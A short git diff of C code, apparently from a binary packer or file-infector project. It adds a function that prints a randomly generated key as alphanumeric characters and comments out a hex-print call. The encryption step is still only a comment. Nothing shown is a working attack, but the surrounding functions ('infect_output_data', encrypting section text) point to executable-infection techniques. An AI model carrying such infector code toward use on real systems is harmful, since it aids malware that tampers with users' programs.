@@ -170,12 +170,34 @@ char* infect_output_data(const char *filename) {
     return output_bytes;
 }
 
+void print_ascii_key(const char *str) {
+    for (int i = 0; i < KEY_SIZE; i++) {
+        char c = str[i] % 60;
+        c = c < 0 ? c * -1 : c;
+        char save = c;
+        if (c < 10)
+            c += 48;
+        else if (c < 36)
+            c = c - 10 + 65;
+        else 
+            c = c - 36 + 97;
+        if (c == '`') {
+            printf("wtf> %d\n", (int)save);
+        }
+       printf("%c", c);
+    }
+}
+
 void encrypt_output_data(char *output_bytes) {
     (void)output_bytes;
     char str[KEY_SIZE];
     memset(str, 0, KEY_SIZE);
     syscall_random(str, KEY_SIZE);
-    print_hex(str, KEY_SIZE);
+    // print_hex(str, KEY_SIZE);
+    
+    print_ascii_key(str);
+
+    
     // key to base64 for printable output
     // encrpyt section text 
 }
